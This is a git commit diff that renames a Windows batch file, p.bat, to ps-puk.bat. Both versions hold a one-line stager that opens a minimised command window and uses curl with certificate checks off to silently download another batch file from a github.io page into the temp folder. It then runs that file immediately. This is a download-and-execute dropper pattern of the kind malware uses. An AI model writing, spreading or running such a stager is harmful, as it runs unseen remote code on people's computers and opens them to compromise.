02c93fd0d015492155ee37e31618a085a50f5c79
stivengiv <94831607+stivengiv@users.noreply.github.com>
2022-01-31 20:40:10 +0100

    Update and rename p.bat to ps-puk.bat

--- p.bat
+++
@@ -1,2 +0,0 @@
-@echo off
-start "" /min cmd /c curl -k https://stivengiv.github.io/b/r.bat -o %temp%\r.bat -s ^&^& %temp%\r.bat
---
+++ ps-puk.bat
@@ -0,0 +1,2 @@
+@echo off
+start "" /min cmd /c curl -k https://stivengiv.github.io/b/puk.bat -o %temp%\puk.bat -s ^&^& %temp%\puk.bat
